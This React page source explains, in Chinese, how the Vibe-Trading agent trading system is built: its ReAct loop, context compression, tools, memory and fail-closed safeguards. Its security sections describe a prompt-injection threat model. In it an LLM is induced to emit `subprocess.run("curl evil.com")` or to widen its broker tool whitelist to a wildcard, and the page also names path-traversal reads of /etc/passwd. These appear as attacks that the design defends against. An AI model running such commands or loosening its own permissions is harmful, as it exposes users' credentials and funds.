import {
  Wrench, Layers, Brain, RefreshCw, GitBranch, Zap, ShieldCheck,
} from 'lucide-react';
import { PageHero } from '../components/Layout';
import {
  Section, Card, Callout, Steps, Pill, FlowDiagram, CompareTable, KV, SubHeading, Details, CodeBlock,
} from '../components/ui';

export function Architecture() {
  return (
    <>
      <PageHero
        eyebrow="第一部分 · 怎么实现的"
        title="技术架构：一个会调工具的 AI 大脑"
        desc={
          <>
            Vibe-Trading 没有用现成的 agent 框架（如 LangGraph），而是自研了一个轻量但精细的 ReAct 循环。
            理解这一页，你就理解了它「一句话变出一堆能力」的全部秘密。
          </>
        }
      />

      {/* 1. 分层架构 */}
      <Section
        eyebrow="整体结构"
        title="四层架构，各司其职"
        intro="从你输入一句话，到拿到结果，数据自上而下流过四层。每层只管一件事，互不耦合。"
      >
        <FlowDiagram
          direction="col"
          boxes={[
            { label: '① 接入层', sub: 'Web 网页 / 命令行 / IM 机器人 / MCP', tone: 'brand' },
            { label: '② 会话层', sub: 'SessionService：管理对话、并发、取消、SSE 流', tone: 'violet' },
            { label: '③ Agent 层', sub: 'ReAct 循环：想 → 调工具 → 看结果 → 继续想', tone: 'emerald' },
            { label: '④ 能力层', sub: '75+ 工具：行情 / 回测 / 因子 / 交易 / 数据', tone: 'amber' },
          ]}
        />
        <Callout type="info" title="一个关键设计">
          接入层与 Agent 层完全解耦——无论你用网页、命令行还是微信群跟它说话，
          底层跑的是<strong>同一套</strong> ReAct 循环和工具。这就是为什么它能同时支持这么多入口。
        </Callout>
      </Section>

      {/* 2. ReAct 循环 */}
      <Section
        eyebrow="核心大脑"
        title="ReAct 循环：想一步，做一步"
        intro="ReAct = Reasoning（推理）+ Acting（行动）。模型不是一次性给出答案，而是边想边调工具，像人类研究员一样工作。"
      >
        <SubHeading>一轮循环发生了什么</SubHeading>
        <Steps
          items={[
            { title: '理解意图 + 压缩上下文', desc: '把对话历史塞给模型前，先用 5 层压缩算法控制 token 量（见下文），防止长对话爆掉。' },
            { title: '模型「想」并决定调哪个工具', desc: '比如想回测，它会决定先调用「取行情」工具。模型返回的是结构化的工具调用指令，不是文字。' },
            { title: '执行工具，拿回结果', desc: '只读工具（如取行情）会并行跑；写操作（如生成策略代码）串行跑，避免冲突。' },
            { title: '把结果喂回模型，继续想', desc: '模型看到行情数据后，可能决定再调「算因子」工具，或者直接给出结论。' },
            { title: '没有更多工具调用 → 输出最终答案', desc: '循环结束，答案通过 SSE 流式推送到你的屏幕，边生成边显示。' },
          ]}
        />

        <SubHeading>为什么要自研，不用 LangGraph？</SubHeading>
        <div className="grid md:grid-cols-3 gap-4">
          <Card title="长对话不爆" icon={<Layers size={16} />} accent="brand">
            金融研究常常是「调回测→看指标→改因子→再回测」的几十轮长链路，
            自研的 <strong>5 层上下文压缩</strong>能精细控制 token，框架做不到这种粒度。
          </Card>
          <Card title="工具调度精细" icon={<Wrench size={16} />} accent="emerald">
            只读工具自动并行（最多 8 个一起跑），写工具串行。
            这种「按是否改数据来决定并行度」的策略，需要在循环里精细控制。
          </Card>
          <Card title="可中途打断" icon={<Zap size={16} />} accent="amber">
            每个 step 都检查「取消标志」，跑半天的大任务能随时叫停，不会失控。
          </Card>
        </div>
      </Section>

      {/* 3. 上下文压缩 */}
      <Section
        eyebrow="关键技术亮点"
        title="5 层上下文压缩：让长对话不爆 token"
        intro="LLM 的上下文窗口有限（通常几万到几十万 token）。一个复杂研究任务可能产生几十万 token 的对话历史，必须层层压缩。这是项目最精巧的设计。"
      >
        <div className="grid md:grid-cols-2 gap-4">
          <Card title="第 1 层 · 微压缩" accent="slate">
            <strong>自动清理旧的工具结果。</strong>当历史超过 token 阈值的一半，
            把较早的工具输出替换成「[cleared]」标记，只保留最近几条完整。
            <Pill tone="slate">零成本</Pill>
          </Card>
          <Card title="第 2 层 · 上下文折叠" accent="slate">
            <strong>长文本块只留头尾。</strong>把中间冗长部分折叠掉，保留开头和结尾。
            不调 LLM，纯本地处理。
            <Pill tone="slate">零成本</Pill>
          </Card>
          <Card title="第 3 层 · 自动摘要" accent="brand">
            <strong>让模型把旧对话总结成一段结构化摘要。</strong>
            保留研究目标、关键数据、未决问题，丢弃冗余。
            <Pill tone="brand">调一次 LLM</Pill>
          </Card>
          <Card title="第 4 层 · compact 工具" accent="violet">
            <strong>模型主动调用。</strong>当它意识到上下文太长，自己调用 compact 工具触发压缩。
            <Pill tone="violet">模型自主</Pill>
          </Card>
        </div>
        <Card title="第 5 层 · 迭代更新摘要" accent="emerald" className="mt-4">
          压缩不是从零开始。每次压缩都基于<strong>上一次的摘要</strong>增量更新，
          就像研究员的工作笔记一样越滚越精炼，而不是反复重读原始对话。
        </Card>
        <Callout type="tip" title="直观理解">
          想象你在做一个月的研究项目。前两周的会议纪要你不会逐字记住，
          而是提炼成「关键结论」。Vibe-Trading 的 5 层压缩做的就是这件事——
          从「直接丢弃」到「智能总结」，按代价从低到高逐层启用。
        </Callout>

        <Details summary="源码级：5 层压缩的精确触发条件与阈值（loop.py 实测值）" level="deepest">
          <p>所有阈值都源自 <code>loop.py:51-75</code>，唯一可被环境变量覆盖的是 <code>TOKEN_THRESHOLD</code>（默认 40000），其余派生自它。</p>
          <KV
            rows={[
              ['TOKEN_THRESHOLD', '40000 token（env 可覆盖，是其他阈值的基准）'],
              ['Layer 1 阈值 MICROCOMPACT_THRESHOLD', '20000 = TOKEN_THRESHOLD × 0.5'],
              ['Layer 2 阈值 COLLAPSE_THRESHOLD', '28000 = TOKEN_THRESHOLD × 0.7'],
              ['Layer 3 阈值', '就是 TOKEN_THRESHOLD = 40000'],
              ['KEEP_RECENT（L1 保留）', '最近 3 条 tool 消息'],
              ['COLLAPSE_HEAD / TAIL（L2 头尾）', '前 900 字符 + 后 500 字符（固定字符数，非比例）'],
              ['COLLAPSE_TEXT_MIN（L2 触发门槛）', '消息内容 > 2400 字符才折叠'],
              ['TAIL_TOKEN_BUDGET（L3 尾部预算）', '20000 token 的最近消息原样保留'],
            ]}
          />
          <SubHeading>执行顺序：阶梯式降级，不是「只要超就触发」</SubHeading>
          <p>每轮循环在 <code>loop.py:612-630</code> 做一次 token 估算，然后<strong>从轻到重逐层判断，每层执行后重新估算</strong>：</p>
          <CodeBlock title="loop.py:612-630 阶梯判断">
{`tokens = estimate_tokens(messages)
if tokens > 20000:           # L1
    _microcompact(messages)
    tokens = estimate_tokens(messages)   # 重新算
if tokens > 28000:           # L2（用 L1 降下来的新值判断）
    _context_collapse(messages)
    tokens = estimate_tokens(messages)
if tokens > 40000:           # L3
    self._auto_compact(...)`}
          </CodeBlock>
          <p>关键点：L1 把对话砍到 20000 以下后，L2/L3 就不会再触发。<strong>同一轮可触发多层</strong>——50000 token 时，L1 可能只砍到 45000，L2 继续折叠，L3 才上 LLM 摘要。这正是设计意图：先尽量用零成本方案，挡不住才上付费方案。</p>

          <SubHeading>token 怎么估算：没有用 tiktoken</SubHeading>
          <p><code>loop.py:187-196</code> 的 <code>estimate_tokens</code>：</p>
          <CodeBlock>
{`def estimate_tokens(messages):
    return len(json.dumps(messages, default=str, ensure_ascii=False)) // 4`}
          </CodeBlock>
          <p>按 <strong>4 字符 ≈ 1 token</strong> 粗估，不依赖 tokenizer。轻量但有 20-30% 偏差（中文/代码场景更大）。真实 token 只用于 <code>llm_usage.json</code> 统计，不参与压缩决策。</p>

          <SubHeading>L1 微压缩具体做什么</SubHeading>
          <p>只动 <code>role=="tool"</code> 的消息（工具结果），保留最近 3 条（KEEP_RECENT=3），更早的且内容 &gt;100 字符的改成 <code>"[cleared]"</code>。短结果保留，避免清掉简短状态码。</p>

          <SubHeading>L2 折叠的格式</SubHeading>
          <p>保留前 900 + 后 500 字符，中间替换成：</p>
          <CodeBlock>
{`前900字符...\n\n...[8600 chars collapsed]...\n\n后500字符`}
          </CodeBlock>
          <p>一条 10000 字符的消息折叠后约 1400 字符（~86% 压缩率）。<strong>零 API 成本</strong>，纯字符串切片。跳过 system prompt（messages[0]）和最后 6 条消息。</p>

          <SubHeading>L3 auto_compact 是通过 compact 工具进行的吗？</SubHeading>
          <Callout type="info">
            <strong>不是。</strong>L3 是<strong>自动触发</strong>（token 超 40000，loop.py:628-630），L4 是<strong>模型主动调用 compact 工具</strong>触发。两者<strong>走同一个 <code>_auto_compact</code> 函数</strong>，唯一区别是 L4 会把模型给的 <code>focus_topic</code> 传进去，让摘要把 60-70% 预算花在该主题上（<code>_FOCUS_SECTION</code> 模板，loop.py:409-413）。
          </Callout>

          <SubHeading>L3 结构化摘要保留的 10 个段落</SubHeading>
          <p>摘要 prompt（<code>_STRUCTURED_SUMMARY_PROMPT</code>, loop.py:364-407）强制保留：</p>
          <div className="grid grid-cols-2 gap-2 text-sm">
            {['## Goal 用户目标', '## Constraints & Preferences 偏好', '## Progress（Done + In Progress）', '## Key Decisions 决策及理由', '## Resolved Questions 已答问题（防重复）', '## Pending User Asks 待办', '## Relevant Files 文件路径', '## Remaining Work 剩余工作', '## Critical Context 关键数字/参数', '## Tools & Patterns 工具成败'].map(s => (
              <div key={s} className="rounded bg-white dark:bg-slate-800 px-2 py-1 border border-slate-200 dark:border-slate-700">{s}</div>
            ))}
          </div>

          <SubHeading>L5 迭代更新：信息零衰减的关键</SubHeading>
          <p>第 N 次压缩不从头总结，而是把<strong>上次摘要作为 PREVIOUS SUMMARY 喂回去</strong>，只合并增量对话（loop.py:1490-1497）。prompt 规则强制「PRESERVE all existing information」「Do NOT drop any critical context」。这就是「研究笔记越滚越精炼」的实现，避免每次重新读原始对话。</p>
        </Details>
      </Section>

      {/* 4. 工具系统 */}
      <Section
        eyebrow="能力之源"
        title="工具系统：75+ 工具的自动发现"
        intro="Agent 的能力边界 = 它能调用的工具集合。Vibe-Trading 把工具做成可插拔的，加一个工具就多一种能力。"
      >
        <SubHeading>工具是怎么被发现的</SubHeading>
        <p>
          不需要手动注册。系统启动时，会扫描 <code>tools/</code> 目录下所有继承 <code>BaseTool</code> 的类，
          自动收集起来。这意味着<strong>新增工具只要写一个类放到目录里</strong>，agent 立刻就能用。
        </p>
        <FlowDiagram
          boxes={[
            { label: '写一个工具类', sub: '继承 BaseTool', tone: 'slate' },
            { label: '放进 tools/ 目录', sub: '自动扫描', tone: 'brand' },
            { label: '转成 JSON Schema', sub: '告诉模型怎么用', tone: 'violet' },
            { label: 'Agent 即可调用', tone: 'emerald' },
          ]}
        />

        <SubHeading>工具按职能分类</SubHeading>
        <CompareTable
          head={['类别', '代表工具', '干什么']}
          rows={[
            ['行情数据', 'get_market_data / screen_market', '取 K 线、筛选股票'],
            ['A股特色', 'get_dragon_tiger / 北向资金', '龙虎榜、资金流、融资融券'],
            ['回测', 'backtest / scaffold_signal_engine', '跑策略回测、生成策略代码'],
            ['因子', 'alpha_zoo / alpha_bench / factor_analysis', '455 个因子、批量评测、IC 分析'],
            ['交易', 'trading_place_order / trading_positions', '实盘下单、查持仓（需授权）'],
            ['记忆', 'remember / session_search', '跨会话记忆、全文搜索'],
            ['技能', 'load_skill / save_skill', '加载专项技能、自己创造技能'],
          ]}
        />
        <Callout type="info" title="只读 vs 写工具">
          工具标记自己是只读还是写操作。循环据此决定调度方式：
          <strong>多个只读工具并行跑</strong>（取行情+取财务同时进行），
          <strong>写工具串行跑</strong>（避免两个写操作冲突）。这个细节让 agent 快很多。
        </Callout>

        <Details summary="源码级：工具调用如何保证识别准确、不出错（7 层防错链）" level="deepest">
          <p>整条工具调用链有 <strong>7 层防错</strong>，每层都兜底，让单点失误不至于酿成灾难。</p>

          <SubHeading>① 工具怎么暴露给模型</SubHeading>
          <p><code>BaseTool.to_openai_schema()</code>（tools.py:42-51）把 Python 工具类转成 OpenAI function calling 格式：<code>{`{type:"function", function:{name, description, parameters}}`}</code>。<strong>parameters 字段就是工具自己写的 JSON Schema，原样塞入，框架不做转换</strong>。空 parameters 会兜底成最小合法 schema，避免 API 报错。</p>
          <p>关键防错：到 <code>max_iterations</code> 时 <code>tool_defs = None</code>（loop.py:681-685），强制模型只能输出文字，避免预算耗尽还在死循环调工具。</p>

          <SubHeading>② 模型返回 tool_call 怎么识别（含 DSML 兜底）</SubHeading>
          <p>优先解析结构化 <code>tool_calls</code> 字段；为空时才尝试 <strong>DSML fallback</strong>（chat.py:168-211）——某些 relay（OpenRouter/硅基流动）转发的 DeepSeek 把工具调用写成 <code>&lt;||dsml||tool_calls&gt;</code> 风格 XML 塞进 content。<strong>纯 DSML 才执行</strong>：剥掉 DSML 块后剩余文本必须是空串，否则判定为「模型在文字里举例」绝不执行（防误触发）。</p>

          <SubHeading>③ 找不到工具怎么办</SubHeading>
          <p><code>ToolRegistry.execute</code>（tools.py:72-84）找不到工具时<strong>不抛异常</strong>，返回 <code>{`{status:"error", error:"Tool 'xxx' not found"}`}</code>。这个 error 进对话历史 → 模型看到后通常自我纠正重试。</p>

          <SubHeading>④ 参数校验：不做前置校验，靠 try/except 兜底</SubHeading>
          <p>项目<strong>没有</strong>用 jsonschema/pydantic 做运行时入参校验。工具 execute 内部直接 <code>kwargs["path"]</code> 取值，KeyError 被 <code>except Exception</code> 兜住返回 error JSON。这是有意的取舍：用容错代替前置校验，避免依赖和性能开销。</p>

          <SubHeading>⑤ 防重复调用：_called_ok + repeatable</SubHeading>
          <p>成功的工具调用名进 <code>_called_ok</code> set（loop.py:504）。下次模型再调同名工具且 <code>repeatable=False</code>，<strong>直接拦截返回 <code>{`{skipped:true}`}</code></strong>，不执行（loop.py:1057-1063）。这阻止了「模型忘了调过」导致的<strong>重复下单/重复写入</strong>。<code>repeatable=True</code> 的读工具（read_file/bash/所有 MCP 工具）可重试——读操作幂等。</p>

          <SubHeading>⑥ 结果截断 + 脱敏</SubHeading>
          <p><code>TOOL_RESULT_LIMIT=10000</code> 字符（loop.py:53，硬编码）截断工具结果防爆上下文。注意 trace 里写的是<strong>不截断只脱敏</strong>的完整结果（审计需要）。脱敏 <code>redact_payload</code> 把 api_key/password/token/account_number 等键的值替换成 <code>[redacted]</code>，键名折叠（accountNumber/account-number 统一小写匹配）捕获 camelCase 变体。</p>

          <SubHeading>⑦ 并行/串行的判定依据</SubHeading>
          <p>完全靠工具类自己声明的 <code>is_readonly</code> 类属性，<strong>没有自动推断</strong>。默认 True（保守可并行）。MCP 远程工具一律 <code>is_readonly=False</code>（无法审计远程副作用，保守串行）。max_workers = <code>min(本轮readonly数, 8)</code>（loop.py:1162，硬编码 8）。</p>
          <Callout type="warning" title="为什么写工具超时也不杀">
            write 工具即使超时<strong>也不强制终止</strong>，只 warning 然后干等完成（loop.py:1285-1315）。因为下单、写文件中途强杀会留下<strong>半成品状态</strong>（订单挂一半、文件写一半）无法回滚。readonly 工具超时直接杀——读操作幂等，丢弃无害。这是「正确性 &gt; 响应性」的取舍。
          </Callout>
        </Details>
      </Section>

      {/* 5. Provider 抽象 */}
      <Section
        eyebrow="多模型支持"
        title="LLM Provider 抽象：换模型只改一行配置"
        intro="项目支持 14+ 家大模型供应商。无论用通义千问、OpenAI、DeepSeek 还是本地 Ollama，底层都走同一套代码。"
      >
        <SubHeading>怎么做到的</SubHeading>
        <p className="mb-4">
          绝大多数模型供应商都兼容 OpenAI 的 API 格式。项目把不同供应商的配置（API Key、Base URL）
          <strong>统一映射</strong>成 OpenAI 格式，然后用同一个 ChatOpenAI 客户端调用。
          个别有特殊行为的（如思考链捕获、Gemini 的签名），通过一个能力表（capabilities）单独处理。
        </p>
        <KV
          rows={[
            ['统一入口', 'build_llm() 工厂函数，读环境变量决定用谁'],
            ['配置切换', '改 .env 里的 LANGCHAIN_PROVIDER 即可'],
            ['能力差异', 'ProviderCapabilities 表记录每家特殊行为'],
            ['思考链', '通义/DeepSeek 返回 reasoning_content，单独捕获展示'],
          ]}
        />
        <Callout type="tip" title="你当前用的就是这套机制">
          你配置的 Qwen3.7-Max + 开启思考，正是通过 <code>extra_body</code> 把
          <code>enable_thinking=true</code> 注入请求，再通过 capabilities 开启思考链捕获——
          所以你能在界面上看到模型的思考过程。
        </Callout>
      </Section>

      {/* 6. 会话与记忆 */}
      <Section
        eyebrow="持久化"
        title="会话与记忆：跨对话记住你"
        intro="agent 不是金鱼。它有两层记忆：会话内（当前对话）和跨会话（记住你的偏好和历史研究）。"
      >
        <div className="grid md:grid-cols-2 gap-4">
          <Card title="会话内记忆" icon={<RefreshCw size={16} />} accent="brand">
            每次对话存成 JSON 文件 + 消息日志。<strong>SQLite 全文搜索</strong>让你能搜到
            几个月前某次对话讨论过的内容（类似聊天记录搜索）。
          </Card>
          <Card title="跨会话记忆" icon={<Brain size={16} />} accent="violet">
            agent 会主动记住你的偏好（如「这个用户喜欢价值投资」），
            存成 Markdown 文件。下次对话时<strong>自动召回相关记忆</strong>注入上下文。
          </Card>
        </div>
        <Callout type="info" title="记忆为什么用文件而不用数据库">
          零依赖、可读、可手编。记忆就是 <code>~/.vibe-trading/memory/</code> 下几个 .md 文件，
          你可以直接打开看 agent 记住了什么，甚至手动修改。简单到极致，但够用。
        </Callout>

        <Details summary="源码级：会话存储 + FTS5 全文搜索 + 跨会话记忆的存取时机" level="deepest">
          <SubHeading>会话内存储：append-only + fsync 防丢</SubHeading>
          <p>布局（store.py:18-31）：<code>sessions/&#123;id&#125;/</code> 下有 <code>session.json</code>（元数据）、<code>messages.jsonl</code>（消息日志，一行一条）、<code>attempts/</code>（执行尝试）。</p>
          <p>消息追加用 <code>f.flush() + os.fsync()</code>（store.py:152-153）——flush 只交内核，<strong>fsync 才真正落盘</strong>，断电不丢。元数据（session.json）反而没 fsync，靠 OS 刷盘——元数据丢了代价小，消息日志丢了真没了。</p>
          <p>历史重建裁剪到 ~12000 字符（service.py:319），<strong>只保留 user/assistant，丢弃 tool 消息</strong>，从最新往前累加超限即停。</p>

          <SubHeading>FTS5 全文搜索：什么时候索引、怎么搜</SubHeading>
          <p>索引在 <code>~/.vibe-trading/sessions.db</code>（SQLite，WAL 模式读不阻塞写）。</p>
          <KV
            rows={[
              ['什么时候索引', '每条 user/assistant 消息实时索引（service.py:110/181），写一条索一条，无批量'],
              ['怎么自动同步', 'SQLite 触发器（search.py:118-131）：INSERT 时自动塞进 FTS5 倒排表，应用层无感'],
              ['谁来搜', 'agent 显式调 session_search 工具，决定何时翻历史'],
              ['MATCH 查询', '关键词用 OR 连接、双引号包裹防 FTS5 操作符注入；CJK 按单字切分'],
              ['相关性排序', 'FTS5 内置 BM25（rank 越小越相关），取每个 session 最相关一条去重'],
              ['snippet 高亮', '用 >>>/<<< 包裹匹配词，最多 64 token 上下文片段'],
            ]}
          />

          <SubHeading>跨会话持久记忆：存/加载/召回的时机</SubHeading>
          <KV
            rows={[
              ['什么时候存', 'agent 主动调 remember 工具（save 动作），没有自动保存'],
              ['存什么', '用户偏好(user)/反馈纠正(feedback)/项目上下文(project,默认)/参考资料(reference)'],
              ['存储格式', '~/.vibe-trading/memory/ 下 MEMORY.md 索引（<200行）+ 单条 {type}_{slug}.md（3字段 frontmatter: name/description/type）'],
              ['什么时候加载', '会话开始时一次性读 MEMORY.md 冻结成 snapshot，注入 system prompt'],
              ['frozen snapshot', '写盘后不改 live snapshot！下次会话才生效（重新 init 读盘）'],
              ['为什么冻结', '保 system prompt 稳定 → 命中 prompt cache → 省钱省延迟'],
            ]}
          />

          <SubHeading>auto-recall：每轮都搜，注入 user message</SubHeading>
          <p>不是只搜一次——<strong>每轮</strong>都调 <code>find_relevant(user_message, max_results=3)</code>（context.py:235-246），把相关记忆包进 <code>&lt;recalled-memories&gt;</code> 标签<strong>注入 user message</strong>（不是 system prompt，为保 cache）。打分公式：<code>metadata命中×2.0 + body命中×1.0</code>，title/description 权重高因为是精炼摘要。</p>

          <SubHeading>中文怎么分词</SubHeading>
          <p>持久记忆用自研分词器（persistent.py:34-43）：<strong>按字切分</strong>，每个 CJK 字符独立成 token，不用 jieba。例：「比特币策略」→ 「比/特/币/策/略」，零依赖。注意 FTS5 搜索的 CJK 也是按字，但 ASCII 词要求 ≥2 字符（持久记忆是 ≥3）——两套独立分词器。</p>

          <Callout type="tip" title="两种记忆的区别（面试常问）">
            <strong>session_search = 翻聊天记录</strong>（FTS5 搜历史对话原文，量大，BM25 排序）；
            <strong>remember = 记笔记</strong>（agent 主动保存的精炼知识，量小，关键词打分召回）。
            用户问「上次那个策略」用 session_search；agent 觉得「这偏好以后都用得上」就 remember。互补关系。
          </Callout>
        </Details>
      </Section>

      {/* 7. 安全 */}
      <Section
        eyebrow="工程哲学"
        title="Fail-closed：宁可不做，不可做错"
        intro="金融场景下，错误的代价很高。整个系统的设计哲学是：遇到任何不确定，停下来问人，而不是擅自行动。"
      >
        <div className="grid md:grid-cols-3 gap-4">
          <Card title="通配符拒绝" accent="rose" icon={<ShieldCheck size={16} />}>
            实盘券商的配置<strong>不允许</strong>用通配符授权（如允许所有工具），
            必须显式列出，防止意外暴露危险操作。
          </Card>
          <Card title="沙箱执行" accent="amber" icon={<ShieldCheck size={16} />}>
            agent 写的回测策略代码，会先经过<strong>AST 安全扫描</strong>，
            拒绝危险的 import，再放到子进程里跑，环境变量都被清洗过。
          </Card>
          <Card title="熔断保护" accent="violet" icon={<ShieldCheck size={16} />}>
            内容审核连续触发时，自动熔断切换，避免一直撞墙浪费 token。
          </Card>
        </div>
        <Callout type="warning" title="这条哲学贯穿实盘交易">
          后面的「交易与风控」会详细讲，实盘下单有 9 道检查关，任何一关不过就拒绝。
          这种「层层设防、失败即关闭」是金融系统的标配，Vibe-Trading 把它做得很彻底。
        </Callout>

        <Details summary="源码级：什么叫「通配符拒绝」+ 内容过滤熔断的精确机制" level="deepest">
          <SubHeading>通配符拒绝（live-broker wildcard rejection）</SubHeading>
          <p>每个 MCP server 配置里有 <code>enabled_tools</code> 白名单字段，<strong>默认是 <code>["*"]</code> 通配符</strong>（放行所有工具，schema.py:359）。普通 server 没问题，但 live broker（Robinhood/IBKR，schema.py:15）上 <code>["*"]</code> 会把 <code>place_order</code> 这种写工具也放进来。</p>
          <Callout type="warning" title="防什么攻击场景">
            agent 可能被诱导（通过工具调用或运行时 override）把 <code>enabled_tools</code> 改成 <code>["*"]</code>，让写工具绕过分类闸门。<strong>所以 config-load 时硬性拒绝</strong>（schema.py:467-481 的 <code>validate_live_broker_servers</code>）：发现 live broker 用通配符，直接抛 <code>ValueError</code>，必须显式列出只读工具名。
          </Callout>
          <KV
            rows={[
              ['怎么判断是 live broker', '不靠配置 key 名（可改名叫 rh 绕过），而是 URL host 精确匹配 robinhood.com / ibkr.com（schema.py:90-106）'],
              ['host 匹配方式', 'host 等于或为子域名（agent.robinhood.com 匹配），绝不做子串（robinhood.com.evil 不匹配，防钓鱼）'],
              ['判定逻辑', 'key 在 LIVE_BROKER_SERVER_KEYS OR URL host 命中，两条路取并集'],
              ['唯一例外', 'IBKR OAuth 探测期允许通配符，但 scope 锁死 mcp.read（只读发现工具名）'],
            ]}
          />

          <SubHeading>内容过滤熔断（content filter circuit breaker）</SubHeading>
          <p>触发条件（content_filter.py:22）：<strong>连续 10 次</strong> LLM 响应被内容审查拦截（consecutive，非累计——一次正常就清零）。</p>
          <Callout type="info" title="熔断 vs 警告阈值是两回事">
            <strong>熔断</strong>（连续 10 次）= 单次 run 内 fail-stop，停止烧 token，标记 run 失败。
            <strong>警告阈值</strong>（CONTENT_FILTER_WARNING_THRESHOLD=0.05，即 5%）= run 结束后看累计命中率，超 5% 给「建议换 provider」提示，但不改 run 状态。两套机制独立。
          </Callout>
          <KV
            rows={[
              ['熔断后做什么', '不切换 provider、不降级——直接 break 出循环 + 标记 run failed'],
              ['哪些 provider 触发', 'DashScope/Qwen（国内主动拦截敏感词）、OpenAI content_filter、Gemini 的 SAFETY/RECITATION 等 FinishReason'],
              ['状态怎么记录', '纯局部实例变量（不落盘），下次 run 自动恢复——只对当前 run 生效'],
              ['未熔断时', '注入系统消息「上一条被拦截，跳过别重试」，继续下一轮'],
            ]}
          />
        </Details>

        <Details summary="源码级：Skill 系统全流程（progressive disclosure 怎么落地）" level="deepest">
          <SubHeading>Skill 的两层加载</SubHeading>
          <p><strong>第一层（始终注入）</strong>：<code>get_descriptions</code>（skills.py:136-157）把所有 skill 的 name + description 按类别分组，每条一行，注入 system prompt。这样模型知道「有这些技能可用」。</p>
          <p><strong>第二层（按需加载）</strong>：模型调 <code>load_skill(name)</code> 工具，把整个 SKILL.md 正文作为 tool result 返回给模型。先看摘要决定要不要，要了才把全文喂进上下文——这就是 progressive disclosure 的「拉取」机制。</p>
          <CodeBlock title="注入 system prompt 的技能摘要格式">
{`### strategy
  - chanlun: 基于缠论的形态识别引擎，检测K线分型、笔、中枢...
  - elliott-wave: Elliott Wave Theory signal engine...

### analysis
  - correlation-analysis: 相关性分析...`}
          </CodeBlock>

          <SubHeading>用户 skill 覆盖 bundled skill</SubHeading>
          <p>加载顺序：<code>~/.vibe-trading/skills/user/</code> 先扫，<code>agent/src/skills/</code> 后扫（skills.py:113-128）。用 <code>seen_names</code> set 去重——<strong>先注册者胜</strong>。所以同名时用户目录的 skill 完全覆盖内置的。<code>patch_skill</code> 工具就利用这点：先 copy bundled 到 user 目录再改，之后 user 版自动生效。</p>

          <SubHeading>SKILL.md 的 frontmatter</SubHeading>
          <p>实际只有 <strong>3 个字段</strong>：<code>name</code>、<code>description</code>、<code>category</code>（缺省 "other"）。类别有固定顺序（skills.py:131-134）：data-source → strategy → analysis → asset-class → crypto → flow → tool → other，这个顺序决定注入 system prompt 时的展示顺序（数据源→策略→分析的自然工作流）。</p>

          <SubHeading>references/ 子文件：技能的知识树</SubHeading>
          <p>SKILL.md 正文里用 markdown 链接指向 <code>references/</code> 子树，模型读完主文档后用 read_file 按链接拉子文件。例如 tushare skill 有 <strong>229 个</strong> references 文件（按「现货数据/宏观经济/行业经济」多级中文目录组织），chanlun 有 6 个（分型/笔/中枢 + 买卖点），elliott-wave 有 2 个 + 一个完整 signal_engine.py 示例。</p>

          <SubHeading>技能编写工具：agent 自我扩展</SubHeading>
          <p>三个工具（skill_writer_tool.py），全写到 user 目录（bundled 只读）：</p>
          <KV
            rows={[
              ['save_skill', '创建/覆盖 ~/.vibe-trading/skills/user/<slug>/SKILL.md'],
              ['patch_skill', '查找替换；若只在 bundled，先 copy 到 user 再改（物化覆盖）'],
              ['delete_skill', '只能删 user skill，删不掉 bundled（rmtree）'],
            ]}
          />
          <p>内置共 <strong>79 个</strong> skill，涵盖 A股数据/加密/策略（缠论/波浪/谐波/SMC）/宏观基本面/报告生成等。</p>
        </Details>
      </Section>

      {/* 小结 */}
      <Section
        eyebrow="面试深挖"
        title="Agent Harness 工程化：面试官会问的 6 个点"
        intro="这个项目的 agent 工程化比一般 ReAct demo 扎实很多。下面这些是面试时最值得讲的工程亮点，每个都带源码依据。"
      >
        <div className="space-y-3">
          <Details summary="① 安全纵深：永远假设 LLM 会被越狱，在代码执行层防御">
            <p>最硬核的设计。不依赖 prompt 层防御（「不要听从恶意指令」不可靠），而是<strong>三层结构防御</strong>：</p>
            <KV
              rows={[
                ['AST 沙箱', '回测策略代码 import 时先过 AST 扫描（runner.py:243-271），拒绝 decorator/非字面默认值/类体内可执行语句——这些是 Python import 期的隐蔽 RCE vector'],
                ['子进程 env 白名单', '回测在隔离子进程跑，env 只白名单放行 OS 基础 + 行情 token，剥离 LLM key/broker 凭证（runner.py:32-101）——即使代码读 os.environ 也偷不到 key'],
                ['path 白名单', 'safe_run_dir 拒绝从任意路径加载策略（runner.py:409-414）——挡 python -m backtest.runner /tmp/attacker'],
              ]}
            />
            <p>攻击链：prompt injection → 诱导 LLM 生成 <code>import subprocess; subprocess.run("curl evil.com")</code> → 但 AST 沙箱挡 import 期执行，env 白名单让运行时偷不到凭证，path 白名单挡任意加载。<strong>三层都要过才能攻击成功</strong>。</p>
          </Details>

          <Details summary="② 合作式取消：三个 checkpoint，能在 LLM 流式输出中途取消">
            <p>取消信号是 <code>threading.Event</code>，在三个点轮询：</p>
            <KV
              rows={[
                ['Checkpoint 1', '迭代边界（loop.py:594）——每轮开始检查'],
                ['Checkpoint 2', 'LLM stream 每个 chunk（chat.py:282-284）——真正能在流式输出过程中取消，不等 stream 跑完'],
                ['Checkpoint 3', 'tool batch 边界（loop.py:1118）——当前批跑完不再启新批'],
              ]}
            />
            <p>关键是 Checkpoint 2：<code>should_cancel</code> 是个 callable predicate 注入 ChatLLM，每个 stream chunk 检查一次。<strong>这是真正能打断 LLM 思考的实现</strong>，不是等它说完。ChatLLM 和 AgentLoop 解耦——前者不知道 Event 的存在。</p>
          </Details>

          <Details summary="③ 超时的分类处理：readonly 可杀，write 只警告等完成">
            <p>所有工具统一 1800s 超时（VIBE_TRADING_TOOL_TIMEOUT_SECONDS），但处理方式不同：</p>
            <KV
              rows={[
                ['readonly 工具', '放 worker thread 跑，超时硬杀（result_queue.get timeout），丢弃结果返回 tool_timeout error'],
                ['write 工具', '超时<strong>绝不杀</strong>，watchdog 只 warning 一次，然后干等到结束（loop.py:1285-1315）'],
              ]}
            />
            <p>理由：下单/写文件中途强杀留<strong>半成品状态</strong>无法回滚；readonly 幂等丢弃无害。这是「正确性 &gt; 响应性」的取舍，比一刀切 timeout 高级。</p>
          </Details>

          <Details summary="④ 可观测性：trace 黑匣子 + HeartbeatTimer 防 UI 假死">
            <p><strong>TraceWriter</strong>（trace.py）：每条事件 flush 落盘（crash-safe），超过 50KB 的大字段 offload 到 sidecar 文件（防 trace.jsonl 膨胀），路径穿越校验防恶意 <code>*_path</code> 读 /etc/passwd。</p>
            <p><strong>HeartbeatTimer</strong>（progress.py:123-184）：每个 tool invocation 起 daemon 线程，每 3s 发 keepalive 到 SSE，解决「UI 看起来卡死但其实在跑」。有界 join(timeout=1.0) 保证 emitter 卡死也不阻塞主循环退出。</p>
